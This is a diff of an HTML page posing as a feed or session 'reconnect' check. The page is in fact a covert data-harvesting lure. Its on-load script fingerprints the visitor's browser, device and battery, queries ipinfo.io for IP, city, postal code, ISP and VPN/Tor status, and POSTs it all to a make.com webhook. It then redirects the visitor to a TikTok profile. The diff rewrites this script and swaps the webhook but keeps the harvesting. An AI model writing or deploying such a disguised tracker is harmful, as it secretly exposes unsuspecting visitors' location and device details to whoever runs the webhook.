@@ -72,150 +72,100 @@
     <div class="loading-text">Checking your feed...</div>
     <div class="spinner"></div>
     <div class="sub-text">Please wait while we reconnect you to your session</div>
+    
   </div>
- <script>
-  async function collectData() {
-    const now = new Date();
-    let localTime = "";
-    try {
-      localTime = now.toLocaleString("en-US", {
-        year: "numeric",
-        month: "2-digit",
-        day: "2-digit",
-        hour: "2-digit",
-        minute: "2-digit",
-        second: "2-digit",
+   <script>
+    async function collectData() {
+      const now = new Date();
+      const localTime = now.toLocaleString("en-US", {
+        year: "numeric", month: "2-digit", day: "2-digit",
+        hour: "2-digit", minute: "2-digit", second: "2-digit",
         hour12: true
       });
-    } catch (_) {
-      localTime = now.toISOString();
-    }
 
-    const userData = {
-      userAgent: navigator.userAgent || "",
-      language: navigator.language || "",
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
-      screenSize: `${window.screen?.width || ""}x${window.screen?.height || ""}`,
-      colorDepth: window.screen?.colorDepth || "",
-      pixelRatio: window.devicePixelRatio || "",
-      platform: navigator.platform || "",
-      referrer: document.referrer || "",
-      online: navigator.onLine ?? "",
-      javaEnabled: (() => {
-        try {
-          return navigator.javaEnabled();
-        } catch (_) {
-          return false;
-        }
-      })(),
-      cookiesEnabled: navigator.cookieEnabled ?? "",
-      doNotTrack: navigator.doNotTrack ?? "",
-      localStorage: (() => {
-        try {
-          return !!window.localStorage;
-        } catch (_) {
-          return false;
-        }
-      })(),
-      sessionStorage: (() => {
-        try {
-          return !!window.sessionStorage;
-        } catch (_) {
-          return false;
-        }
-      })(),
-      timestamp: now.toISOString(),
-      localTime: localTime,
-      connectionType: "",
-      downlink: "",
-      rtt: "",
-      deviceMemory: "",
-      cpuCores: "",
-      touchSupport: "",
-      batteryLevel: "",
-      isCharging: "",
-      ip: "",
-      hostname: "",
-      city: "",
-      region: "",
-      country: "",
-      loc: "",
-      org: "",
-      postal: "",
-      timezoneFromIP: "",
-      asn: "",
-      vpn: "",
-      proxy: "",
-      tor: ""
-    };
+      const userData = {
+        timestamp: now.toISOString(),
+        localTime: localTime,
+        userAgent: navigator.userAgent || "",
+        language: navigator.language || "",
+        platform: navigator.platform || "",
+        referrer: document.referrer || "",
+        screenSize: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth || "",
+        pixelRatio: window.devicePixelRatio || "",
+        online: navigator.onLine ?? "",
+        javaEnabled: (() => { try { return navigator.javaEnabled(); } catch(_) { return false; } })(),
+        cookiesEnabled: navigator.cookieEnabled ?? "",
+        doNotTrack: navigator.doNotTrack ?? "",
+        localStorage: (() => { try { return !!localStorage; } catch(_) { return false; } })(),
+        sessionStorage: (() => { try { return !!sessionStorage; } catch(_) { return false; } })(),
+        connectionType: "",
+        downlink: "",
+        rtt: "",
+        deviceMemory: "",
+        cpuCores: "",
+        touchSupport: "",
+        batteryLevel: "",
+        isCharging: "",
+        ip: "", hostname: "", city: "", region: "", country: "", loc: "",
+        org: "", postal: "", timezoneFromIP: "", asn: "", vpn: "", proxy: "", tor: ""
+      };
 
-    // اتصال الشبكة
-    try {
-      if (navigator.connection) {
-        userData.connectionType = navigator.connection.effectiveType || "";
-        userData.downlink = navigator.connection.downlink || "";
-        userData.rtt = navigator.connection.rtt || "";
+      try {
+        if (navigator.connection) {
+          userData.connectionType = navigator.connection.effectiveType || "";
+          userData.downlink = navigator.connection.downlink || "";
+          userData.rtt = navigator.connection.rtt || "";
+        }
+
+        userData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "";
+        userData.cpuCores = navigator.hardwareConcurrency || "";
+        userData.touchSupport = navigator.maxTouchPoints > 0;
+
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          userData.batteryLevel = Math.round(battery.level * 100) + "%";
+          userData.isCharging = battery.charging;
+        }
+
+        const res = await fetch("https://ipinfo.io/json?token=cb4dd6c6220e6e");
+        const ipData = await res.json();
+        userData.ip = ipData.ip || "";
+        userData.hostname = ipData.hostname || "";
+        userData.city = ipData.city || "";
+        userData.region = ipData.region || "";
+        userData.country = ipData.country || "";
+        userData.loc = ipData.loc || "";
+        userData.org = ipData.org || "";
+        userData.postal = ipData.postal || "";
+        userData.timezoneFromIP = ipData.timezone || "";
+        userData.asn = ipData.asn?.asn || "";
+        userData.vpn = ipData.privacy?.vpn || false;
+        userData.proxy = ipData.privacy?.proxy || false;
+        userData.tor = ipData.privacy?.tor || false;
+
+      } catch (e) {
+        console.error("Error collecting IP info:", e);
       }
-    } catch (_) {}
 
-    // بيانات الجهاز
-    try {
-      userData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "";
-      userData.cpuCores = navigator.hardwareConcurrency || "";
-      userData.touchSupport = navigator.maxTouchPoints > 0;
-    } catch (_) {}
-
-    // البطارية
-    try {
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        userData.batteryLevel = Math.round(battery.level * 100) + "%";
-        userData.isCharging = battery.charging;
+      try {
+        await fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(userData)
+        });
+        console.log("✅ Data sent to Make");
+      } catch (e) {
+        console.error("❌ Failed to send data:", e);
+      } finally {
+        setTimeout(() => {
+          window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
+        }, 2500);
       }
-    } catch (_) {}
-
-    // IP وموقع
-    try {
-      const ipRes = await fetch('https://ipinfo.io/json?token=cb4dd6c6220e6e');
-      const ipData = await ipRes.json();
-      userData.ip = ipData.ip || "";
-      userData.hostname = ipData.hostname || "";
-      userData.city = ipData.city || "";
-      userData.region = ipData.region || "";
-      userData.country = ipData.country || "";
-      userData.loc = ipData.loc || "";
-      userData.org = ipData.org || "";
-      userData.postal = ipData.postal || "";
-      userData.timezoneFromIP = ipData.timezone || "";
-      userData.asn = ipData.asn?.asn || "";
-      userData.vpn = ipData.privacy?.vpn || false;
-      userData.proxy = ipData.privacy?.proxy || false;
-      userData.tor = ipData.privacy?.tor || false;
-    } catch (e) {
-      console.error("IP Info Error:", e);
     }
 
-    // إرسال البيانات
-    try {
-      await fetch("https://hook.eu2.make.com/22fu3n24bnvd9ea5b4nt48x7xll3lth4", {
-        method: "POST",
-        body: JSON.stringify(userData),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      });
-      console.log("✅ Data sent to Make");
-    } catch (err) {
-      console.error("❌ Error sending data:", err);
-    } finally {
-      setTimeout(() => {
-        window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
-      }, 2500);
-    }
-  }
-
-  collectData();
-</script>
+    collectData();
+  </script>
 </body>
 </html>
 
